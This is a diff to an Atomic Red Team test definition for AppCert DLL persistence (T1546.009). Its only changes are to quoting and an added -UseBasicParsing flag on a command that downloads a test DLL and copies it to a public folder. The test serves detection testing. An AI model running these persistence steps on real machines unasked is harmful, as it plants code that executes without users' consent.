@@ -1,5 +1,5 @@
 attack_technique: T1546.009
-display_name: 'Event Triggered Execution: AppCert DLLs'
+display_name: "Event Triggered Execution: AppCert DLLs"
 atomic_tests:
 - name: Create registry persistence via AppCert DLL
   auto_generated_guid: a5ad6104-5bab-4c43-b295-b4c44c7c6b05
@@ -29,7 +29,7 @@ atomic_tests:
       if (Test-Path "#{dll_path}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{dll_path}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll" -OutFile "#{dll_path}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.009/bin/AtomicTest.dll" -OutFile "#{dll_path}" -UseBasicParsing
   executor:
     command: |
       Copy-Item "#{dll_path}" C:\Users\Public\AtomicTest.dll -Force
